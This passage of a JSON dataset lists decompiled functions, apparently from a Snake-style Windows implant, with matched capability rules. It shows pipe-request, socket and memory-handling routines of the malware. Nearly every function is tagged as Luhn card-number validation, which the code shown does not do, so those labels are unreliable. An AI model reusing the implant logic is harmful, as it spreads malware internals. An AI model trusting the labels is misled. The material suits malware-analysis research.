        "decompiled_code": "\nvoid __cdecl fcn.200162ab(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_10h = 0;\n    var_ch = arg_ch;\n    var_8h = arg_10h;\n    fcn.20016229(arg_8h, &var_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 134
    },
    "2001662f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001662f(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    if (*(arg_8h + 4) != 0) {\n        fcn.20011dff(*(arg_8h + 4), arg_ch, arg_10h);\n        return;\n    }\n    fcn.20011f1d(*(arg_8h + 8), arg_ch, arg_10h, arg_8h + 0x18, 0);\n    return;\n}\n",
        "token_count": 118
    },
    "200167b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.200167b1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.2001662f(arg_8h, arg_ch, arg_10h);\n    if (iVar1 == 0) {\n        fcn.20016666(arg_8h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "200167f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.200167f7(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.20011cc7(*(arg_8h + 0xc), arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 82
    },
    "2001687f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.2001687f(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 4) != 0) {\n        fcn.20012045(*(param_1 + 4), param_2, 0);\n        return;\n    }\n    fcn.200120a1(*(param_1 + 8), param_2, param_1 + 0x18, 0);\n    return;\n}\n",
        "token_count": 100
    },
    "200168ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.200168ae(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.2001687f(arg_8h, arg_ch, 0);\n    if (iVar1 == 0) {\n        fcn.20016666(arg_8h, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "20016c8e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.20016c8e(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t arg_10h_00;\n    uint *arg_8h_00;\n    int32_t iVar1;\n    uint var_4ch;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_10h_00 = (*_sym.imp.msvcrt.dll_malloc)(0x124);\n    if (arg_10h_00 == 0) {\n        return 0x21590004;\n    }\n    sub.ntdll.dll_memset(arg_10h_00, 0, 0x124);\n    fcn.20001551(arg_10h_00 + 0xd0);\n    fcn.20001551(arg_10h_00 + 0xf0);\n    fcn.200012fa(arg_10h_00 + 0xe8);\n    var_ch = arg_ch;\n    var_8h = 0;\n    if (arg_18h == 0) {\n        if (arg_10h == 0) {\n            var_4h = 0x21590064;\n            goto code_r0x20016da9;\n        }\n        arg_8h_00 = arg_10h_00 + 8;\n        var_4h = fcn.20011afa(arg_8h_00, &var_ch, arg_10h, arg_14h, arg_20h);\n    }\n    else {\n        arg_8h_00 = arg_10h_00 + 4;\n        var_4h = fcn.20011b1d(arg_8h_00, &var_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    if (var_4h == 0) {\n        *(arg_10h_00 + 0xc) = *arg_8h_00;\n        if ((arg_10h != 0) && (arg_18h == 0)) {\n            (*_sym.imp.ntdll.dll_sprintf)(&var_4ch, \"rcv_buf=%d%c\", 0x9fff6, 0);\n            fcn.20011c1d(*(arg_10h_00 + 0xc), &var_4ch, 0);\n            iVar1 = 10;\n            do {\n                fcn.20016551();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n            fcn.20001cfb(arg_10h_00 + 0x10, 0x200169b6, arg_10h_00);\n        }\n        *(arg_10h_00 + 0x114) = 1;\n        *arg_8h = arg_10h_00;\n        return var_4h;\n    }\ncode_r0x20016da9:\n    if (*(arg_10h_00 + 0xc) != 0) {\n        fcn.20011b43(arg_10h_00 + 0xc, 0);\n    }\n    fcn.200012a9(arg_10h_00 + 0xe8);\n    fcn.2000155c(arg_10h_00 + 0xd0);\n    fcn.2000155c(arg_10h_00 + 0xf0);\n    (*_sym.imp.msvcrt.dll_free)(arg_10h_00);\n    return var_4h;\n}\n",
        "token_count": 817
    },
    "20016e1b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20016e1b(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    if (*(arg_8h + 0xc) == NULL) {\n        fcn.20013534(*(arg_8h + 0x14), arg_ch, arg_10h);\n    }\n    else {\n        (**(arg_8h + 0xc))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "20016e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20016e40(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.2001340b(*(arg_8h + 0x14), arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 83
    },
    "20016e5f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20016e5f(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    (**(arg_8h + 0x10))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 83
    },
    "20016e7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20016e7a(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.2001372c(*(arg_8h + 0x14), arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 84
    },
    "200170c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200170c6(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *unaff_EDI;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = 0;\n    if (arg_8h != NULL) {\n        *arg_8h = 0;\n    }\n    var_8h = in_EAX + 0x68;\n    fcn.20001567(var_8h);\n    if (*(in_EAX + 0x198) == 0) {\n        if (*(in_EAX + 400) == *(in_EAX + 0x194)) {\n            var_10h = *(in_EAX + 0x58);\n            var_ch = 0;\n            var_4h = fcn.2001300b(unaff_EDI, &var_10h, 0, 0, *(in_EAX + 0x54), *(in_EAX + 0x5c), *(in_EAX + 0x60));\n            if (var_4h == 0) {\n                for (puVar3 = *(in_EAX + 100); puVar3 != NULL; puVar3 = *puVar3) {\n                    if (puVar3[1] == 0) {\n                        var_4h = fcn.20013534(*unaff_EDI, puVar3 + 5);\n                        if (var_4h != 0) {\n                            fcn.20013237();\n                            goto code_r0x200171f8;\n                        }\n                    }\n                    else {\n                        fcn.200136d0(*unaff_EDI, puVar3[2], puVar3 + 5, puVar3[3], puVar3[4]);\n                    }\n                }\n                var_4h = 0;\n            }\ncode_r0x200171f8:\n            fcn.2000157d(var_8h);\n            if (var_4h != 0) {\n                return var_4h;\n            }\n            if (arg_8h == NULL) {\n                var_4h = fcn.2001348f(*unaff_EDI, 0);\n                if (var_4h == 0) {\n                    return 0;\n                }\n                fcn.20013237();\n                return var_4h;\n            }\n            *arg_8h = 1;\n            return 0;\n        }\n        uVar1 = *(in_EAX + 0x194) & 0x8000001f;\n        if (uVar1 < 0) {\n            uVar1 = (uVar1 - 1 | 0xffffffe0) + 1;\n        }\n        *(in_EAX + 0x194) = uVar1;\n        *unaff_EDI = *(in_EAX + 0x90 + uVar1 * 8);\n        *(in_EAX + 0x90 + *(in_EAX + 0x194) * 8) = 0;\n        *(in_EAX + 0x94 + *(in_EAX + 0x194) * 8) = 0xffffffff;\n        uVar1 = *(in_EAX + 0x194) + 1U & 0x8000001f;\n        if (uVar1 < 0) {\n            uVar1 = (uVar1 - 1 | 0xffffffe0) + 1;\n        }\n        *(in_EAX + 0x194) = uVar1;\n    }\n    else if (*(in_EAX + 0x1a0) == 0) {\n        if (*(in_EAX + 0x19c) == 0) {\n            iVar2 = 0x21590003;\n        }\n        else {\n            *unaff_EDI = *(in_EAX + 0x19c);\n            *(in_EAX + 0x1a0) = 1;\n        }\n    }\n    else {\n        iVar2 = 0x21590064;\n    }\n    fcn.2000157d(var_8h);\n    return iVar2;\n}\n",
        "token_count": 944
    },
    "2001747d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001747d(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = arg_8h;\n    iVar1 = arg_8h + 0x144;\n    *(arg_8h + 0x38) = 1;\n    fcn.20001567(iVar1);\n    iVar4 = arg_8h + 0x48;\n    arg_8h = 0xb;\n    do {\n        fcn.20013237(iVar4, 1);\n        iVar4 = iVar4 + 0x18;\n        arg_8h = arg_8h + -1;\n    } while (arg_8h != 0);\n    fcn.20013237(iVar3 + 0x14, 0);\n    iVar3 = iVar3 + 0x40;\n    iVar4 = 0xb;\n    do {\n        iVar2 = fcn.20001d41(iVar3);\n        if (iVar2 != 0) {\n            fcn.20001d55(iVar3, 0);\n            fcn.20001d2f(iVar3);\n            *(iVar3 + -4) = 3;\n        }\n        iVar3 = iVar3 + 0x18;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    fcn.2000157d(iVar1);\n    return;\n}\n",
        "token_count": 335
    },
    "2001785a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.2001785a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    iVar1 = 0;\n    if (0 < *(param_1 + 0xb8)) {\n        puVar2 = param_1 + 0x1c;\n        do {\n            (*_sym.imp.msvcrt.dll_free)(*puVar2);\n            iVar1 = iVar1 + 1;\n            puVar2 = puVar2 + 4;\n        } while (iVar1 < *(param_1 + 0xb8));\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "20017887": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.20017887(int32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(*(arg_8h + 4) + 0x10) + 0x38) == 0) {\n        if (*(arg_8h + 8) == 0) {\n            return 0x21590001;\n        }\n        if (*(arg_8h + 0x10) != 0) {\n            return *(arg_8h + 0x14);\n        }\n        sub.ntdll.dll_memset(&s, 0, 0xc);\n        pcVar1 = _sym.imp.WS2_32.dll_htonl;\n        s = *(arg_8h + 0xc);\n        var_4h._0_1_ = 3;\n        s = (*_sym.imp.WS2_32.dll_htonl)(s);\n        var_8h = (*pcVar1)(var_8h);\n        sub.ntdll.dll_memset(&var_1ch, 0, 0x10);\n        var_18h = &s;\n        var_1ch = arg_ch;\n        var_14h = 0xc;\n        iVar2 = fcn.20013845(*(*(arg_8h + 4) + 0xc), &var_1ch, 0);\n        if (iVar2 != 0x21590003) {\n            return iVar2;\n        }\n    }\n    return 0x21590006;\n}\n",
        "token_count": 393
    },
    "20017a2b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20017a2b(uint *arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = arg_8h;\n    iVar2 = sym.inj_snake_Win32.dll_tr_get_callbacks(*arg_8h);\n    while( true ) {\n        do {\n            iVar3 = (**(iVar2 + 8))(*puVar1, &arg_8h, &var_4h, 100, 0);\n            if ((iVar3 != 0) && (puVar1[3] != 0)) {\n                iVar3 = 0x21590006;\n            }\n        } while (iVar3 == 0x21590002);\n        if (iVar3 != 0) break;\n        iVar3 = sym.inj_snake_Win32.dll_tc_write_request_pipe(puVar1[1], puVar1[2], arg_8h, var_4h, 0);\n        (**(iVar2 + 4))(*puVar1, arg_8h, 0);\n        if (iVar3 != 0) {\ncode_r0x20017aa8:\n            puVar1[3] = 1;\n            return 0;\n        }\n    }\n    if (puVar1[3] == 0) {\n        sym.inj_snake_Win32.dll_tc_cancel(puVar1[1], puVar1[2]);\n    }\n    goto code_r0x20017aa8;\n}\n",
        "token_count": 349
    },
    "20017ab8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.20017ab8(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.ntdll.dll_memset(&var_ch, 0, 0xc);\n    pcVar1 = _sym.imp.WS2_32.dll_htonl;\n    var_ch = *(arg_8h + 0xc);\n    var_4h._0_1_ = 6;\n    var_ch = (*_sym.imp.WS2_32.dll_htonl)(var_ch);\n    var_8h = (*pcVar1)(var_8h);\n    fcn.20013589(*(*(arg_8h + 4) + 0xc), &var_ch, 0xc, 0);\n    return;\n}\n",
        "token_count": 195
    },
    "20017c34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.20017c34(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t arg_8h_00;\n    uint uVar2;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.ntdll.dll_memset(&var_ch, 0, 0xc);\n    pcVar1 = _sym.imp.WS2_32.dll_htonl;\n    var_ch = arg_ch;\n    var_4h._0_1_ = 3;\n    var_ch = (*_sym.imp.WS2_32.dll_htonl)(arg_ch);\n    var_8h = (*pcVar1)(var_8h);\n    sub.ntdll.dll_memset(&var_1ch, 0, 0x10);\n    var_18h = &var_ch;\n    var_14h = 0xc;\n    var_1ch = arg_10h;\n    arg_8h_00 = fcn.2001708f(arg_ch);\n    if (arg_8h_00 == 0) {\n        return 0x21590006;\n    }\n    uVar2 = fcn.20013845(arg_8h_00, &var_1ch, 0);\n    return uVar2;\n}\n",
        "token_count": 327
    },
    "20017df1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20017df1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n    var_ch = arg_ch;\n    var_8h = arg_10h;\n    fcn.20017887(arg_8h, &var_10h);\n    return;\n}\n",
        "token_count": 115
    },
    "20018151": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20018151(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *unaff_ESI;\n    uint uVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint s;\n    uint var_8h;\n    \n    uVar2 = 0;\n    sub.ntdll.dll_memset(&s, 0, 0x10);\n    sub.ntdll.dll_memset(&var_20h, 0, 0x10);\n    var_20h = arg_8h;\n    var_1ch = *unaff_ESI;\n    var_18h = unaff_ESI[1];\n    var_14h = 0;\n    iVar1 = fcn.20001cfb(&s, fcn.20017982, &var_20h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.20001cfb(&var_8h, fcn.20017a2b, &var_20h);\n        if (iVar1 == 0) {\n            fcn.20001d55(&s, 0);\n            fcn.20001d55(&var_8h, 0);\n            goto code_r0x200181db;\n        }\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x200181db:\n    iVar1 = fcn.20001d41(&s);\n    if (iVar1 != 0) {\n        fcn.20001d2f(&s);\n    }\n    iVar1 = fcn.20001d41(&var_8h);\n    if (iVar1 != 0) {\n        fcn.20001d2f(&var_8h);\n    }\n    return uVar2;\n}\n",
        "token_count": 407
    },
    "20018210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20018210(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *unaff_EDI;\n    uint var_190h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_20h;\n    uint var_18h;\n    int32_t var_ch;\n    uint *var_8h;\n    \n    sub.ntdll.dll_memset(&var_190h, 0, 0x178);\n    var_160h = *unaff_EDI;\n    var_15ch = unaff_EDI[1];\n    var_20h = 1;\n    sub.ntdll.dll_memset(&var_18h, 0, 0x18);\n    var_8h = &var_190h;\n    var_ch = fcn.2001708f(unaff_EDI[2]);\n    if (var_ch == 0) {\n        iVar1 = 0x21590003;\n    }\n    else {\n        do {\n            iVar1 = fcn.20017e24(&var_18h);\n        } while (iVar1 == 0);\n        fcn.20017cb4(unaff_EDI[2], 1);\n    }\n    return iVar1;\n}\n",
        "token_count": 273
    },
    "2001829b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.2001829b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n    var_8h = arg_14h;\n    var_ch = arg_10h;\n    fcn.20017b0b(arg_8h, arg_ch, &var_10h, arg_18h, arg_1ch, arg_20h, arg_24h);\n    return;\n}\n",
        "token_count": 174
    },
    "200182dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.200182dd(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n    var_8h = arg_14h;\n    var_ch = arg_10h;\n    fcn.20017c34(arg_8h, arg_ch, &var_10h);\n    return;\n}\n",
        "token_count": 126
    },
    "2001863b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001863b(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t unaff_EBX;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x14);\n    if (puVar1 == NULL) {\n        var_4h = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(puVar1, 0, 0x14);\n        var_4h = fcn.200170c6(&var_8h);\n        if (var_4h == 0) {\n            fcn.20001a1f(unaff_EBX + 0x1c);\n            do {\n                iVar2 = fcn.200018bf();\n                puVar1[1] = iVar2;\n                piVar3 = *(unaff_EBX + 0x18);\n                if (piVar3 == NULL) break;\n                do {\n                    if (iVar2 == piVar3[1]) break;\n                    piVar3 = *piVar3;\n                } while (piVar3 != NULL);\n            } while (piVar3 != NULL);\n            *puVar1 = *(unaff_EBX + 0x18);\n            *(unaff_EBX + 0x18) = puVar1;\n            *arg_8h = puVar1[2];\n            *arg_ch = puVar1[1];\n            fcn.20001a68(unaff_EBX + 0x1c);\n            if (var_8h == 0) {\n                var_4h = 0;\n            }\n            else {\n                var_4h = fcn.2001348f(*arg_8h, 0);\n                if (var_4h != 0) {\n                    fcn.20017cb4(*arg_ch, 0);\n                    *arg_8h = 0;\n                    *arg_ch = 0;\n                }\n            }\n        }\n        else {\n            (*_sym.imp.msvcrt.dll_free)(puVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 500
    },
    "2001892b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001892b(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    if ((arg_ch == 0xe) && (arg_14h == 8)) {\n        fcn.20018151(arg_8h);\n        return;\n    }\n    fcn.200136d0(*(*(arg_8h + 4) + 0xc), arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 129
    },
    "20018969": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.20018969(int32_t *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x1a4);\n    if (iVar1 != 0) {\n        sub.ntdll.dll_memset(iVar1, 0, 0x1a4);\n        *(iVar1 + 4) = 0x20016ee5;\n        *(iVar1 + 8) = 0x20016e99;\n        *(iVar1 + 0xc) = 0x20017012;\n        *(iVar1 + 0x10) = fcn.200185b1;\n        iVar2 = fcn.20012123(iVar1, 0x20046688);\n        if (iVar2 != 0) {\n            fcn.20001551(iVar1 + 0x68);\n            fcn.20001911(iVar1 + 0x1c);\n            *(iVar1 + 0x198) = 1;\n            *(iVar1 + 0x19c) = *(*(in_EAX + 4) + 0xc);\n            fcn.20013299(*(*(in_EAX + 4) + 0xc), *(in_EAX + 200));\n            *(*(in_EAX + 4) + 0xc) = 0;\n            *(in_EAX + 200) = 0;\n            sub.ntdll.dll_memset(param_1, 0, 8);\n            *param_1 = iVar1;\n            return 0;\n        }\n        (*_sym.imp.msvcrt.dll_free)(iVar1);\n    }\n    return 0x21590004;\n}\n",
        "token_count": 385
    },
    "20018d1b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20018d1b(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    if ((arg_ch == 0xe) && (arg_14h == 8)) {\n        fcn.20018969(arg_10h);\n        return;\n    }\n    fcn.2001372c(*(*(arg_8h + 4) + 0xc), arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 130
    },
    "20018d57": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20018d57(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n    var_8h = arg_14h;\n    var_ch = arg_10h;\n    fcn.20018b92(arg_8h, arg_ch, &var_10h, arg_18h, arg_1ch);\n    return;\n}\n",
        "token_count": 143
    },
    "20018d91": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.20018d91(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x28);\n    if (iVar1 == 0) {\n        iVar2 = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(iVar1, 0, 0x28);\n        var_4h = 0;\n        var_8h = arg_ch;\n        iVar2 = fcn.20022d89(iVar1 + 4, &var_8h, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h & 3 | 0x10000);\n        if (iVar2 == 0) {\n            fcn.20001551(iVar1 + 8);\n            *arg_8h = iVar1;\n        }\n        else {\n            (*_sym.imp.msvcrt.dll_free)(iVar1);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 290
    },
    "20018e4a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20018e4a(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = arg_8h;\n    iVar2 = fcn.20023027(*(arg_8h + 4), &arg_8h, 0);\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x28);\n        if (iVar2 == 0) {\n            fcn.20022f7c(&arg_8h, 0);\n            iVar2 = 0x21590004;\n        }\n        else {\n            sub.ntdll.dll_memset(iVar2, 0, 0x28);\n            *(iVar2 + 4) = arg_8h;\n            *(iVar2 + 0x24) = *(iVar1 + 0x24);\n            fcn.20001551(iVar2 + 8);\n            *arg_ch = iVar2;\n            iVar2 = 0;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 246
    },
    "20018ecc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20018ecc(int32_t arg_8h, char *arg_ch)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint var_84h;\n    char *var_4h;\n    \n    pcVar1 = arg_ch;\n    var_4h = arg_ch;\n    iVar2 = fcn.20023757(&var_4h, &var_84h, 0x80, &arg_ch);\n    do {\n        if (iVar2 == 0) {\n            fcn.2002323c(*(arg_8h + 4), pcVar1, 0);\n            return;\n        }\n        iVar2 = (*_sym.imp.ntdll.dll__stricmp)(&var_84h, 0x2002fa60);\n        if (iVar2 == 0) {\n            if (*arg_ch != '1') {\n                iVar2 = (*_sym.imp.ntdll.dll_toupper)(*arg_ch);\n                if (iVar2 != 0x59) goto code_r0x20018f35;\n            }\n            *(arg_8h + 0x24) = 1;\n        }\ncode_r0x20018f35:\n        iVar2 = fcn.20023757(&var_4h, &var_84h, 0x80, &arg_ch);\n    } while( true );\n}\n",
        "token_count": 298
    },
    "20019096": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20019096(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.20023113(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 79
    },
    "200190b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.200190b5(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.20023346(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 80
    },
    "200190d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.200190d4(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.200233a2(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 81
    },
    "2001916e": {
        "rules": [
